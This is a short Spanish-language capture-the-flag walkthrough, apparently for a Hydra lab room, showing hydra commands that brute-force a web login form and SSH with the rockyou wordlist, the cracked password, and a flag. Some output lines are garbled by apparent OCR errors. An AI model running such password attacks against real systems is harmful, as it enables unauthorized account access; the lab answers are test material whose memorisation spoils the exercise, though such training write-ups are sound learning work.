## Tarea 2
Con hydra podemos realizar ataques de fuerza bruta en formulario web 

`hydra -l molly -P /usr/share/wordlists/rockyou.txt  10.10.67.151(http://machine_ip/) http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."`

- `username` es el campo de formulario donde se ingresa el nombre de usuario
- nombre de usuario (s) especificado reemplazará `^USER^`
- `password` es el campo de formulario donde se ingresa la contraseña
- Las contraseñas proporcionadas serán reemplazadas `^PASS^`
- `F=incorrect` es una cadena que aparece en la respuesta del servidor cuando falla el inicio de sesión

El resultado de ejecutar el comando es:
`[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login`
`tries`
`—896525 tries per task`
`[DATA] attacking http-post-form://IO.IO.136.137:80/Iogin:username=AUSERA6password=APASSA:your username or password is inco`
`sunshine`
`host: 10.10.67.151`
`login: molly`
`password :sunshine`

Con esa información podemos ingresar y encontrar la primera bandera:
![[Pasted image 20250415015642.png]]
Para la segunda bandera utilizaremos ssh 
`hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.67.151 ssh`
y encontramos la segunda bandera:
`molly@ip-10-10-136-137 cat flag2.txt`
`fHM{c8eeb0468febbadea859baeb33b2541b}`
`Ans`
